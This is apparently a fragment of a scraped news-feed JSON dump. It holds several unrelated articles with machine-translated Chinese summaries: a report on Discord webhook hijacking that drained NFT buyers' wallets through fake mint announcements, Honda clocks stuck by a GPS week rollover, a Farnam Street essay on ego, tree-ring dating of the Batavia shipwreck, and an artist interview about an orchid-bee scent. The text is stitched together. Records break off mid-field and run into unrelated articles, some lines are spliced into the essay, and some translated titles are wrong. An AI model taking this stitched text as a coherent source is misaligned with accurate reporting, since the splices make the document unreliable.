Like many projects in the crypto world, the NFT collection Monkey Kingdom and in-game asset marketplace Fractal both engaged heavily with their communities through Discord chat servers. Both projects were about to distribute rewards to their community members: Monkey Kingdom through an NFT presale on the day of the 21st and Fractal through a token airdrop \u2014 essentially a free distribution to early supporters \u2014 a few days later.\n Then, disaster struck. Posts appeared in the official \u201cannouncements\u201d channel of each project claiming that a surprise mint would reward community members with a limited edition NFT. Hundreds jumped at the chance \u2014 but for those who followed the links and connected their crypto wallets, a costly surprise was waiting. Rather than receiving an NFT, wallets were being drained of the Solana cryptocurrency, which both projects used for purchases.\n In the space of an hour, a Twitter post, first  from Monkey Kingdom and  then from Fractal, informed followers that their Discord servers had been hacked; news of the NFT mints was bogus, the links a phishing fraud. In the case of Fractal, the scammers  got away with about $150,000 worth of cryptocurrency. For Monkey Kingdom, the estimated total was  reported to be $1.3 million.\n the same techniques that hype up a sale can also open the door to hackers\n Neither attack targeted the blockchain or the tokens themselves. Instead, the thieves exploited weaknesses in the infrastructure used to sell the tokens \u2014 specifically, the Discord chatrooms where NFT fans gather. It\u2019s a reminder of a persistent weakness in the growing NFT economy, where surprise drops have primed buyers to move fast or risk missing out. But the same techniques that hype up a sale can also open the door to hackers \u2014 and in this case, a single compromise can end up spreading to more than one community at once.\n In this case, the NFTs thieves had targeted a feature known as a webhook. Webhooks are used by many web applications (Discord included) to listen for a message sent to a particular URL and trigger an event in response, like posting content to a certain channel. You can think of a webhook like a secret phone number, a unique identifier that can be \u201ccalled\u201d (or, in a closer approximation, \u201ctexted\u201d) to connect to an application on the other end.\n By gaining access to webhooks belonging to the Fractal and Monkey Kingdom Discord servers, the hackers were able to send messages that were broadcast to all members of certain channels: a feature meant to be used only for official communications from the project teams. This was where the fake \u201cannouncement\u201d had come from and why it had pointed to a scam address. In hindsight, the content should have raised some red flags \u2014 but given the distribution method, it looked just legitimate enough that many were fooled.\n \u201cwe are always working to make it harder for these attacks to happen and will continue to invest in education and tools to help protect our users\u201d\n Discord webhooks are used to automate messages based on activities in other applications: for example, the  official documentation describes making a bot that notifies a channel of new GitHub commits. But it\u2019s easy to lose track of those bots amid the various third-party service integrations, and crucially, there\u2019s no way to switch off all of them at once if you\u2019ve been hacked. The result is a major opportunity for attackers and a liability for any Discord communities who aren\u2019t paying attention to their integrations.\n A Discord spokesperson said the company cautioned people to be careful when giving others access to their devices and personal information and pointed to guidance made available through its Moderator Academy  resource center.\n \u201cDiscord takes the safety of all users and communities very seriously, including social engineering attacks like these,\u201d said Peter Day, senior manager of corporate communications at Discord. \u201cWhile there are clear controls in place, we are always working to make it harder for these attacks to happen and will continue to invest in education and tools to help protect our users.\u201d\n \u201cThis is one of those things that really hurts you, both in terms of pride and professionalism\u201d\n The origin of the hack appears to have been a service called Grape Network, which provides community management tools to Fractal, Monkey Kingdom, and hundreds of other crypto projects that used Discord. Roughly a week before the cryptocurrency theft, an employee of Grape Network going by the screen name Arximedis had been caught by a separate scam on another Discord server entirely, this one belonging to Solana.\n By first manipulating a Solana moderator, then Arximedis himself, through a  phishing attack that involves getting the target banned, the hackers had managed to obtain an account access token that let them perform actions on behalf of the Grape administrator. It was enough to let them create an avenue to send messages to the Fractal and Monkey Kingdom Discord channels. With the groundwork in place, the hackers kept quiet and waited for a time to strike.\n Grape Network founder Dean Pappas confirmed to  The Verge that his colleague had been the target of the initial hack and that this first hack had been exploited to create the webhooks that were used in the second. \u201cThis is one of those things that really hurts you, both in terms of pride and professionalism,\u201d Pappas said. \u201cIt\u2019s a very difficult situation.\u201d\n In a statement sent via Twitter, the head of the Monkey Kingdom project (who asked to be referred to by the pseudonym \u201cMonkey King\u201d) said that additional security measures had now been put in place to avoid future attacks and ensure the safety of users. The Monkey King also pointed to the money raised by the project to refund victims of the scam.\n NFT projects are particularly vulnerable to this kind of attack because they move so quickly. Hyped projects often sell out within hours \u2014 or sometimes minutes \u2014 so early adopters are conditioned to act fast. And Discord, now the go-to platform for NFT communities, is where the early intel on presales and airdrops is released first. That means community members are primed to jump on any announcements that give them an edge, which, in turn, lets scammers leverage fake messages to devastating effect.\n  In the most heated drops, making a successful transaction can be difficult even for the early movers.  A Chainalysis examination of one popular project showed that more than 26,000 unsuccessful mint transactions occurred within the first hour after launch, each of which used up nonrefundable transaction fees. All told, more than $4 million was spent on gas fees for unsuccessful transactions.\n There\u2019s no indication yet that the NFT craze will slow in 2022, which means there\u2019ll be no shortage of new projects looking to scale by using off-the-shelf solutions to build their infrastructure. There are signs that Discord, the beating social pulse of the NFT community, is also a goldmine for unscrupulous individuals looking to separate marks from their hard-earned coins \u2014 but perhaps as techniques of moderation and server administration in the community improve, more rigorous management of problem areas (like webhooks and third-party plugins) will reduce risk.\n The good news is that, for the two projects affected by this particular hack, there may be sunnier days ahead. Fractal, the game asset marketplace,  went live on the penultimate day of 2021. And having reimbursed money that was lost by members, Monkey Kingdom is relaunching the NFT line that was interrupted by the hack. The community is loyal, the Monkey King told us, and fans are once again ready to pick up a deal.", "posttime": "2022-01-10 01:24:49", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u9ed1\u5ba2,nft,hacking,\u653b\u51fb", "title": "\u4e0d\u548c\u8c10\u9ed1\u5ba2\u662fNFT\u4e70\u5bb6\u7684\u6700\u65b0\u5a01\u80c1", "title_en": "Discord Hacking is the Newest Threat For NFT Buyers", "transed": 1, "url": "https://www.theverge.com/2022/1/7/22870912/nft-communities-boom-discord-hackers-cryptocurrency-webhooks", "via": "", "real_tags": ["\u9ed1\u5ba2", "nft", "hacking", "\u653b\u51fb"]}, {"category": "", "categoryclass": "", "imagename": "e820db917f0e9ee6cec2ad4b899ac5f0.jpg", "infoid": 1072533, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "JALOPNIK\u6536\u4ef6\u7bb1\u5df2\u7ecf\u4eae\u8d77\u4e86\u5173\u4e8e\u672c\u7530\u6c7d\u8f66\u57282002\u5e74\u7684\u4e00\u5b9a\u65f6\u95f4\u5185\u5361\u4f4f\u7684\u65f6\u949f\u548c\u65e5\u5386\u7684\u62a5\u544a\u3002\u8513\u5ef6\u4ee4\u4eba\u5370\u8c61\u6df1\u523b\uff0c\u5f71\u54cd\u52302004\u5e74\u548c2012\u5e74\u65b0\u7684\u672c\u7530\u548cACURA\u6a21\u578b\u3002\u8fd9\u662f\u53ef\u80fd\u53d1\u751f\u7684\u4e8b\u60c5\u3002\n\u6211\u4eec\u521a\u6536\u5230\u4e86\u4e00\u4e9b\u5173\u4e8e\u8fd9\u4e00\u70b9\u7684\u4fe1\u606f\uff0c\u5e76\u5efa\u8bae\u672c\u7530\u6280\u672f\u90e8\u95e8\u76ee\u524d\u6b63\u5728\u52aa\u529b\u3002\u4e00\u65e6\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u672c\u5468A\u6388\u6743\u7ecf\u9500\u5546\u5c06\u610f\u8bc6\u5230\u8fd9\u4e00\u70b9\uff0c\u5e76\u4e14\u80fd\u591f\u5728\u90a3\u65f6\u534f\u52a9\u8fd9\u4e00\u70b9\u3002\u5c06\u5411\u6211\u4eec\u7684\u7ecf\u9500\u5546\u53d1\u51fa\u670d\u52a1\u516c\u544a\uff0c\u4ece\u672c\u7530\u82f1\u56fd\u53d1\u5e03\u4e86\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6700\u597d\u54a8\u8be2\u60a8\u5f53\u5730\u7684\u672c\u7530\u6388\u6743\u7ecf\u9500\u5546\u8fdb\u884c\u4efb\u4f55\u66f4\u65b0\uff0c\u56e0\u4e3a\u5b83\u4eec\u5c06\u6709\u6700\u65b0\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u53ef\u4ee5\u5e2e\u52a9\u91ca\u653e\u4fee\u590d\u540e\u534f\u52a9\u3002\u5982\u679c\u6709\u5fc5\u8981\uff0c\u4ed6\u4eec\u8fd8\u53ef\u4ee5\u8054\u7cfb\u672c\u7530\u6280\u672f\u90e8\u95e8\u989d\u5916\u7684\u63f4\u52a9\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4e0b\u9762\u7684\u94fe\u63a5\u67e5\u770b\u6700\u8fd1\u7684\u672c\u7530\u6388\u6743\u7ecf\u9500\u5546\u53ca\u5176\u8054\u7cfb\u65b9\u5f0f\u3002\n\u672c\u7530\u6ca1\u6709\u89e3\u91ca\u540e\u53f0\uff0c\u4f46\u662f\u89e3\u51b3\u65b9\u6848\u662f\u53d1\u9001\u66f4\u65b0\u78c1\u76d8\u4ee5\u4fee\u590d\u9519\u8bef\u3002\u76ee\u524d\u95ee\u9898\u6ca1\u6709\u4fee\u590d\u3002\u672c\u7530\u8bf4\uff0c\u5b83\u6b63\u5728\u8c03\u67e5\uff0c\u5982\u679c\u6ca1\u6709\u627e\u5230\u4fee\u590d\uff0c\u90a3\u4e48\u65f6\u949f\u5e94\u8be5\u57288\u6708\u7684\u67d0\u4e2a\u65f6\u5019\u7ea0\u6b63\u81ea\u5df1\u3002", "note_en": "The Jalopnik inbox has been lit up with a number of reports about clocks and calendars in Honda cars getting stuck at a certain time in the year 2002. The spread is impressive, impacting Honda and Acura models as old as 2004 and as new as 2012. Here\u2019s what might be happening.\n  If you scroll through a   Honda or   Acura   forum right now, chances are you\u2019re going to run into a bunch of confused owners. When they hopped into their cars on January 1 they found the clocks on their navigation systems frozen at a certain time. And the calendar date? 2002, or 20 years ago.\n The issue is widespread, hitting a huge number of cars in Acura\u2019s and Honda\u2019s   lineup with navigation systems. And it\u2019s not just in the United States, as owners in Canada and even as far as the United Kingdom have all reported similar issues.\n      As a number of Honda and Acura owners have noted on these forums, their clocks read correctly until what appeared to have been the first time update of 2022. Then, their navigation systems turned into time machines, leaving them behind as they went back to 2002.\n    American Honda is aware of a potential concern related to the clock display on certain older Acura and Honda models equipped with navigation systems. We are currently investigating this issue to determine possible countermeasures and have no additional details to share at this time.\n  Owners have also reached out and received different responses. American Honda provided the CR-V Owners Club   forum this response:\n We have escalated the NAVI Clock Issue to our Engineering Team and they have informed us that you will experience issue from Jan 2022 thru August 2022 and then it will auto-correct. Please be assured that we will continue to monitor this and will advise you if a fix is available before that time.\n   We have just received some more information regarding this and were advised that the Honda technical department are currently working on this. Once there is a fix for this issue Honda authorized dealers will be made aware of it and will be able to assist with this at that point. A service bulletin will be issued to our dealers from Honda UK on how to fix this. As such it would be best to check with your local Honda authorized dealer for any updates as they would have the latest information for this and will be able to assist once the fix is released. They can also contact the Honda technical department for additional assistance with this if necessary. You can see the nearest Honda authorized dealers and their contact details by using the link below.\n  If you have experience coding or troubleshooting software, the possible cause of this time warp probably popped into your head early on.\n Drive Accord   forum user Jacalar went into the navigation system\u2019s diagnostic menu on Sunday and discovered that the GPS date was set to May 19, 2002, or exactly 1024 weeks in the past.\n  Global Positioning Systems measure time from an epoch, or a specific starting point used to calculate time. The date is broadcasted including a number representing the week, coded in 10 binary digits. These digits count from 0 to 1023 then roll over on week 1024. GPS weeks first started on January 6, 1980 before first zeroing out on midnight August 21, 1999. It happened again April 6, 2019. The next happens in 2038.\n   If software isn\u2019t coded to account for the rollover, weird stuff can happen, like a calendar going back exactly 1024 weeks. It\u2019s impossible to know for sure without being able to look at Honda\u2019s programming, but these navigation systems might be programmed so that the start of their week counter is a date 19.6 years in the past, but not in-line with GPS epoch.\n Owners should be able to turn off the automatic update function and set the date and time manually, but they\u2019re finding that the functionality doesn\u2019t work right now. Likewise, the clock resets back to the incorrect time every time the car is started.\n  This isn\u2019t the first time that Honda and Acura owners have experienced this issue.   On August 16, 2017, Hondas and Acuras with navigation systems from model years 1999 through 2004 had their clocks reset to 0:00 and their calendars roll back to January 1, 1998. It then happened  again   on January 1, 2021 to many owners. In all cases, the time lost adds up to 1024 weeks.\n Honda didn\u2019t explain the cause back then, but the solution then was to send out update disks to fix the errors. There is no fix for the current issue. Honda says it\u2019s investigating and if it does not find a fix, the clocks should correct themselves sometime in August.", "posttime": "2022-01-10 01:23:18", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u65f6\u949f,clocks,\u672c\u7530", "title": "\u672c\u7530\u65f6\u949f\u8fc7\u53bb\u56f0\u6270\u4e8620\u5e74\uff0c\u6ca1\u6709\u4fee\u590d", "title_en": "Honda Clocks Are Stuck 20 Years In The Past And There Isn't A Fix", "transed": 1, "url": "https://jalopnik.com/honda-clocks-are-stuck-20-years-in-the-past-and-this-mi-1848306970", "via": "", "real_tags": ["\u65f6\u949f", "clocks", "\u672c\u7530"]}, {"category": "", "categoryclass": "", "imagename": "c52c30a9cee9f47cc5dee3cb7d9009aa.jpg", "infoid": 1072531, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4eba\u4eec\u53cd\u590d\u72af\u7684\u4e00\u4e2a\u5927\u9519\u8bef\u4e13\u6ce8\u4e8e\u8bc1\u660e\u81ea\u5df1\u662f\u6b63\u786e\u7684\uff0c\u800c\u4e0d\u662f\u4e13\u6ce8\u4e8e\u5b9e\u73b0\u6700\u4f73\u7ed3\u679c\u3002\u8fd9\u662f\u53f3\u8fb9\u7684\u9519\u8bef\u4e00\u9762\u3002\n[quote]\u6211\u52aa\u529b\u5b9e\u73b0\u6211\u60f3\u51fa\u7684\u6700\u597d\u7684\u7ed3\u679c\uff0c\u800c\u4e0d\u662f\u53ef\u80fd\u7684\u6700\u4f73\u7ed3\u679c\u3002[/ quote]", "note_en": "One big mistake people repeatedly make is focusing on proving themselves right, instead of focusing on achieving the best outcome.

Your goal is to be less wrong.\u201d\n \u2014 Elon Musk\n One of the biggest differences between running a company and working for a company is how you tend to think about solving problems.\n As a knowledge worker employed by someone else, I wanted to be right. I saw being right as how I proved my worth to both myself and the company. The best outcome was my being right. Because \u2026\n  But \u2026 I couldn\u2019t be wrong. My ego wouldn\u2019t let me.\n   [quote]I worked toward achieving the best outcome I came up with myself and not the best outcome that was possible.[/quote]\n For the longest time, I thought that if the winning idea wasn\u2019t my idea, I\u2019d be nothing. I thought no one would see me as valuable. No one would see me as insightful. People would think I wasn\u2019t adding value. And worse, I\u2019d see myself as not contributing.\n  \u201cAvoid having your ego so close to your position that when your position falls, your ego goes with it.\u201d\n \u2014 Colin Powell\n I had so much of my identity wrapped up in being right that I was blind to  how the world really works. I was  acting like an amateur \u2014 I worked toward achieving the best outcome I came up with myself and not the best outcome possible.\n At Farnam Street, one of our principles is that we work with the world as it really is, not as we want it to be. My desire to be right reflected how I wanted the world to work, not how it actually worked. Instead of trying to be right, I try to  be less wrong.\n The most important lesson I\u2019ve learned from running a company is that the more I give up trying to be right, the better the outcomes get for everyone. I don\u2019t care who gets the credit. I care about creating the best possible work.", "posttime": "2022-01-10 01:18:01", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u9519\u8bef,wrong,\u4e13\u6ce8", "title": "\u53f3\u8fb9\u7684\u9519\u8bef\u4e00\u9762", "title_en": "The Wrong Side of Right", "transed": 1, "url": "https://fs.blog/wrong-side-right/", "via": "", "real_tags": ["\u9519\u8bef", "wrong", "\u4e13\u6ce8"]}, {"category": "", "categoryclass": "", "imagename": "a0db05b8df2bbeefce9ed2559cc33823.jpeg", "infoid": 1072530, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u672c\u6587\u6700\u521d\u5728\u8c08\u8bdd\u4e2d\u53d1\u8868\uff0c\u5e76\u5728\u521b\u9020\u6027\u7684\u516c\u5171\u573a\u5408\u4e2d\u91cd\u65b0\u53d1\u5e03\u3002\n\u4f46\u5728\u65b0\u7684\u7814\u7a76\u4e2d\uff0c\u6211\u4eec\u7814\u7a76\u4e86Batavia\u6d77\u96be\u6728\u6750\u7684\u6811\u5708\u3002\u6211\u4eec\u53d1\u73b0\u8239\u4f53\u7684\u6a61\u6728\u6765\u81ea\u4e24\u4e2a\u72ec\u7acb\u7684\u68ee\u6797\uff08\u5728\u5fb7\u56fd\u5317\u90e8\u548c\u6ce2\u7f57\u7684\u6d77\u5730\u533a\uff09\uff0c\u6728\u6750\u4e3a\u6846\u67b6\u5143\u7d20\uff0c\u4e3b\u8981\u6765\u81ea\u4e0b\u8428\u514b\u68ee\u5dde\u7684\u68ee\u6797\u3002\u6811\u6728\u780d\u4f10\u540e\u4e0d\u4e45\uff08\u57281625\u6216\u66f4\u9ad8\uff09\u540e\u4e0d\u4e45\u52a0\u5de5\uff0c\u5f53\u9020\u8239\u8005\u5207\u6210\u5f62\u72b6\u65f6\u4ecd\u7136\u662f\u7eff\u8272\u7684\u3002\n\u5e78\u8fd0\u7684\u662f\uff0c\u6811\u6212\u6307\u53ef\u4ee5\u4e3a\u8fd9\u4e9b\u95ee\u9898\u63d0\u4f9b\u7b54\u6848\u3002\u6e29\u5e26\u6c14\u5019\u533a\u7684\u6811\u6728\u6bcf\u5e74\u90fd\u5728\u6811\u76ae\u4e0b\u5f62\u6210\u4e00\u4e2a\u751f\u957f\u6212\u6307\u3002\u8fd9\u79cd\u589e\u957f\u73af\u5e8f\u5217\u4ea7\u751f\u591a\u5e74\u548c\u51e0\u5341\u5e74\u7684\u884c\u4e3a\u7c7b\u4f3c\u4e8e\u73af\u5883\u6761\u5f62\u7801\uff0c\u8fd9\u662f\u4e00\u79cd\u751f\u957f\u6a21\u5f0f\uff0c\u7279\u522b\u662f\u5728\u4ed6\u4eec\u589e\u957f\u548c\u6b7b\u4ea1\u7684\u5730\u65b9\u3002\n\u8fd9\u6b3e\u6ce2\u7f57\u7684\u6d77\u6728\u6750\u88ab\u827a\u672f\u5bb6\u4eec\u6240\u73cd\u89c6\uff0c\u5982\u4f26\u52c3\u6717\uff0c\u4ed6\u4eec\u5c06\u5176\u7528\u4e8e\u7ed8\u753b\u7684\u9762\u677f\u3002\u6765\u81ea\u8fd9\u4e2a\u5730\u533a\u7684\u6811\u6728\u5177\u6709\u7cbe\u7f8e\u7684\u76f4\u7ebf\u6212\u6307\uff0c\u6212\u6307\u975e\u5e38\u597d\uff0c\u4f7f\u6728\u6750\u6613\u4e8e\u5de5\u4f5c\u548c\u7a33\u5b9a\u3002", "note_en": "This article was originally published at  The Conversation  and has been republished under Creative Commons.\n The wrecking of the Dutch East India Company ship Batavia in 1629 is perhaps the best-known maritime disaster in Australian history. The subject of books, articles, plays, and even an opera, Batavia was wrecked on a chain of small islands off the coast of Western Australia.\n Of Batavia\u2019s 341 crew and passengers, 40 drowned trying to get off the ship, while all others made it to the uninhabited islands nearby. The captain, senior officers, two women, and one child left in one of the ship\u2019s boats to get help. But further tragedy followed.\n A group of men on the islands who had gathered around the acting commander deliberately drowned, strangled, cut the throats, or brutally hacked to death 125 children, women, and men. When the rescue party returned months later, they managed to overpower this death squad and bring the remaining survivors to safety. Together with its many victims and the murderers, Batavia\u2019s wreckage was left in the Houtman Abrolhos archipelago.\n The Dutch ship was 45.3 meters long and 600 metric tons in size. It sank on its maiden voyage to Southeast Asia. The shipwreck was found in the 1960s off Morning Reef and was excavated in the 1970s.\n  The surviving stern section, now in Fremantle\u2019s Western Australian Shipwrecks Museum, is the only portion of any early 17th-century Dutch East India ship raised from the seabed and preserved.\n Previously, historians could only guess where the timber for such ships came from, when it was felled, or how it was used, as archival records of Dutch timber trade before 1650 are rare or lost.\n But in\u00a0 new research, we studied the tree rings of the Batavia shipwreck timbers. We have found that the oak for the hull was sourced from two separate forests (in northern Germany and the Baltic region), with wood for the framing elements coming predominantly from the forests of Lower Saxony. The timber was processed shortly after the trees were felled (in 1625 or later) and was still green when the shipbuilders cut and bent the planks into shape.\n Knowing more about these timbers helps us understand the Dutch success in world trade, including how they managed to build such large ocean-going vessels and so many of them.\n   Batavia\u2019s remains provide a rare archaeological resource for tree-ring examination because exact dates of its construction and sinking are known.\n Construction began sometime in the spring of 1626, and the ship set sail from Texel (the Netherlands) to the East Indies (known today as Indonesia) in October 1628. It struck a reef on June 4, 1629. As Batavia had never undergone repairs or maintenance work, we know every piece of timber belongs to the original structure.\n When Batavia was built, the Dutch were the foremost shipbuilders in Europe. By 1640, for example, around 1,000 seagoing ships were being constructed in the Netherlands each year, mostly for export markets.\n The Dutch lacked domestic timber resources to supply the bustling shipbuilding industry and yet would have needed hundreds, perhaps thousands, of oak trees to build Batavia.\n Where did all this timber come from? The Dutch East India Company archives provide no detailed information on where its shipyards bought timber at the time of Batavia\u2019s construction. While the company kept detailed records from the mid-17th century onward, hardly any of those from the early 1600s have survived.\n Fortunately, tree rings can provide answers to those questions. Trees in temperate climate zones form a growth ring each year, just under the bark. This sequence of growth rings produced over years and decades acts like an environmental bar code, a growth pattern that is particular to the place where they grew and died.\n  This growth pattern is very similar for trees of the same species growing in the same area.\n By measuring the ring widths from many trees, a reference tree-ring chronology can be built. Then, we can cross match the growth pattern of a specific timber to such reference chronologies, establishing when the tree was felled and where it had grown. This field of study is  known as dendrochronology.\n The many Batavia timbers we sampled had only heartwood, or interior rings, demonstrating that Dutch shipbuilders discarded the sapwood (outer rings). Sapwood is softer and contains substances that make it more vulnerable to insect infestation and decay.\n Furthermore, the outermost heartwood ring of the Batavia hull planks that we sampled dates to 1616. When accounting for the missing sapwood (nine rings for Baltic oak), this means the trees were felled in 1625 or later.\n The timber was processed shortly after the trees were felled. All this demonstrates that Batavia\u2019s builders were skilled craftspersons, intimately familiar with the properties of the wood they used.\n  The oak timber used in Batavia\u2019s hull planks came from two forests. Trees from near L\u00fcbeck in northern Germany were used above the ship\u2019s waterline, while timber from the Baltic region of Northeastern Europe was applied exclusively below the waterline.\n This Baltic timber was prized by artists like\u00a0 Rembrandt, who used it for panels on which to paint. Trees from this region had beautifully straight trunks with very fine growth rings, making the wood easy to work and stable.\n Obviously, company shipbuilders valued these same properties when building ships strong enough to endure several return voyages to Southeast Asia. They avoided using trees with knots in the hull and preferred wood from which they could fashion long and strong planks.\n  In contrast, we found that the timber for Batavia\u2019s framing elements came predominantly from the forests of Lower Saxony (northwest Germany). Frames utilized the strong properties of these oaks\u2019 curved wood fibers. As it was sourced closer to home, this timber may have been cheaper and easier to acquire.\n Our study was only possible because Batavia\u2019s hull was raised in its entirety. Waterlogged wood is mushy, so extracting samples from the timbers while still under water is always challenging. It also would have required cutting out large sections of the ship to access all the different elements.", "posttime": "2022-01-10 01:17:14", "source_domain": "news.ycombinator.com", "source_name":

"With the new work  Euglossini cologne, interdisciplinary artist Hsurae has made a case for why the new scent she has created is not merely metaphoric and why reconstructed scents are intellectual structures, really little more than a metaphor or an abstraction of what once was.\n Orchid bees ( Euglossini) have a unique fragrance biology\u2014 they are thought to be the only species other than humans that gather ingredients and make fragrance compositions. In decline from Mexico to Brazil, these bees are the sole pollinators of many flowers including the Vanilla Orchid.\u00a0 Hsurae has created a computation of the fragrance of this bee through \u201cscientific instrumentality.\u201d She has written, \u201cWhen their ecology is dead and the species long gone, this may serve as the only memory of the orchid bee.\u201d\n   Even though it\u2019s about this sense of this organic animal, it\u2019s really about how the memory of this  species can become encapsulated by scientific means, and how science tells its stories about this relationship with nature. I was very inspired by this collaborative project between Daisy Ginsberg, Sissel Tolaas and synthetic biologists, that took place at Ginkgo Bioworks in Boston.\n The project \u201cResurrecting the Sublime\u201d that was about reviving the scent of extinct plants?\n Yes, they went through extinct species in the Harvard Arboretum and extracted DNA and analyzed it. Then they revived some of the aromatic compounds that were used to create the scent of that particular plant.\n  I was drawn to this project because it felt like a very poetic move, trying to recreate a scent of something that\u2019s extinct. At the same time, Ginkgo Bioworks is a biotech company, so it\u2019s very scientific and deterministic. However, in the project, with the DNA that Ginkgo analyzed, there could be a lot of ways the different kinds of compounds could have been mixed together in any number of ratios to create the very specific scent to this plant, so the reconstruction of the flower\u2019s smell still may be lost. What they have is a variation they came up with, even though it\u2019s based on some sort of scientific DNA analysis, it\u2019s just one of the million possibilities of the scent that this plant could hold that nobody living has smelled before. But the way that the story is told is that the scientists collaborating with artists have managed to revive the scent of an extinct plant species. It got me thinking about the relationship of science with nature and how it turns nature into specimens, which can only specify their value as a thing, as an object to be observed.\n The first thing that struck me about  Euglossini cologne was that the fragrance was contained in this machined, corrosion resistant, stainless-steel vault of a bottle. Can tell us about that?\n I really wanted that kind of monolithic scientific authority. I wanted it to have an important presence in this scent piece. And that was the reason for the container. It is a vessel for high pressure and high temperature chemical reactions. Inside the steel is a little Teflon tub and that\u2019s where the liquid is held. You might have noticed that there\u2019s a key, a steel rod that goes through it to create a very tight secure encapsulation. That\u2019s the key to tighten that seal. It gets you more leverage to really tighten it down. When you remove it, you\u2019re not supposed to be able to open the chamber by hand. In that way, it also functions as a kind of time capsule. And so that goes with what I was saying about the timeframe of this piece.\n How did you arrive at the need to preserve the smell that the orchid bee creates?\n Well, I actually first arrived at bee orchid by way of the XKCD comic strip.\u00a0There\u2019s this kind of sexual reproduction replication happening in certain species of orchids that binds the bee species pollinating them to itself. Certain species of orchids rely on a specific kind of bee to pollinate them. A lot of them form these one-to-one mutual relationships. And through time, the sexual organs of these orchid flowers evolve to look like the female species of that bee that they want to pollinate them.\n There was this comic strip by XKCD that is about this bee orchid. It narrates that there\u2019s this kind of orchid, whose partner bee has gone extinct, so the only memory we have of this bee that once existed lies in the interpretation of a flower of what the genital of this kind of bee looked like. It\u2019s quite a touching comic. The last frame stated that \u201cthe only memory of the bee is a painting by a dying flower.\u201d\n Then Donna Haraway wrote about this. So, I first came to this little anecdote through that comic strip, but then reading Haraway\u2019s book, \u201cStaying with the Trouble\u201d in the chapter about sym-poiesis, which means \u2018making with\u2019, she was talking about this particular comic strip, commenting on how it\u2019s special because it didn\u2019t mistake lures for identity. It\u2019s not saying that this bee orchid is exactly what the female bee\u2019s reproductive organs look like. It is a rendering of its image through the interpretation of the flower.\n  I arrived at the orchid bee by chance, when I was googling bee orchid but typed it in reverse. But then I saw how these bees were really the first species in nature to create perfumes. That was the part that got me interested in orchid bees. So, I started reading more and more about them. There are many types of orchid bees. I feel like the scent they collect is really a map of the territory that they inhabit. It\u2019s like a scent map. It\u2019s also a lot of the bees\u2019 agency that goes into creating their particular types of scent. I was thinking about that and reading accounts of how more and more of these kinds of bees are going extinct because their habitats are being destroyed. That\u2019s one of the reasons why my statement for this piece is in a style that mimics that last line of the comic where it says the last memory of the extinct bee is painted by a dying flower. I was thinking about how, when all the habitats are gone and all of these species are extinct, how science might claim to recreate this ephemeral smell that they made during their lifetimes\u2026\n In  Euglossini cologne,the scent compounds used in this smell are mimicking the scent traps that are used by scientists to trap orchid bees for study. It\u2019s a synthesis of the smell through science, but it\u2019s also an interpretation, a very human interpretation through the tools of science of what the scent could smell like, and how that serves as a more accurate memory of this species.\n So, the scent that you have created is based on the hormonal chemical components that research scientists deciphered that attract the male bee?\u00a0The bee\u2019s perfume that it compiled on its body was not scientifically analyzed?\n Yes. What scents they collect is dependent on which species of orchid bees they are and their particular habitat. They\u2019re known to collect from sources that we humans find disgusting, like feces or rotten meat or rotting wood, but it\u2019s the complexity of their perfume that really counts when it comes to mating season, and not really how pleasant smelling that perfume is. It\u2019s that unpleasant aspect of it, but I really wanted the skatole to come out.\n The work takes one into insect cognition and perception of scent, questioning the difference of scent perception in human species and insect species. What\u2019s actually perceived as pleasant and what\u2019s conceived as important.\n What is conceived as a culturally important scent? I\u2019ve also been reading a lot about olfactory racism and how scent is construed in the social life and how power lacks scent. When you go into institutions that are supposed to be some kind of institute of authority, like a bank or a museum, you don\u2019t smell anything. The lack of smell is a symbol of power. And what humans find disgusting is very much conditioned through the colonial era. And so, how what we deem as pleasant and unpleasant is already racially coded, are some facets that really interest me about scents. It\u2019s not just how good it smells or how bad it smells, but it\u2019s all really ingrained in there.\n   When did your interest in the smell and the chemical communication enter your work?\u00a0 Is this your most important work so far in that area?\n Yes, kind of. I guess that interest developed as I was fermenting different kinds of materials. So, SCOBY is one of them. I also ferment vegetables, seafood sometimes, and it\u2019s become a real interest of mine. And in the beginning, it was more about the material that I was interested in using, as in using in my own practice. But then in the process of fermenting these things, the scent of it really starts to impose on you. And for me, especially in New York where living space is so small and tight, I was really living in those quarters with all these different scents. And I was just really interested in  kind of this medium as its own medium of communication that we humans really don\u2019t understand as much as we like.\n I have always been interested in the scientific side of scents. My work with the SCOBY was heavily about the microbiome and how we\u2019re outnumbered by other cells and how we can reconstruct our own sense of identity and individualism through this knowledge that we\u2019re always more other than ourselves, like what we can see to be ourselves. And so, in all these microbiome studies, I would be drawn to scent repercussions in microbiomes. There\u2019s always been the knowledge that, for example, we choose our partners subconsciously on the kind of scent that they  admit emit. And we\u2019ve never really understood why. And now there\u2019s a microbiome interpretation of that saying that it\u2019s this subconscious form of communication that\u2019s not to the human, but maybe to the immune system, to the cells in the immune system or the bacteria in the microbiome of the human that communicates that this person\u2019s microbiome and hence immune system is complimentary to your own.\n So that scent that we\u2019re drawn to is us looking, subconsciously looking for compatible immunological profiles to form partnerships with, because it maybe evolution that gave us an advantage to form family units with people whose health is complementary to our own. I approached or arrived at scent in these two very different ways. One is a very embodied, very lived-in relationship with different scents. And then the other is really more cerebral or more intellectual engagement with  its scent. It all kind of came together with this new piece in the exhibition New York/New Fumes.\n Considering you have this background with the biome and the fact that bacteria manufacture different volatile compounds\u2014 smells, what do you think about the idea that the bees might be collecting the types of microorganisms that they need. Bacteria produce characteristic odors.\n That could be. That could very much be. Maybe they\u2019re collecting their own little microbiomes. However, I don\u2019t think I\u2019ve read anything about it. I\u2019ve read about microbiomes and bees that exist under guts, but for these orchid bees, they collect these scents into these two pouches under their hind legs and they rub them against their front legs which covers the scent compounds in lipids and fat, and stores it in that pouch. So, some sort of chemical reaction I think happens in the pouch. I\u2019m not completely sure there is a live bacterial 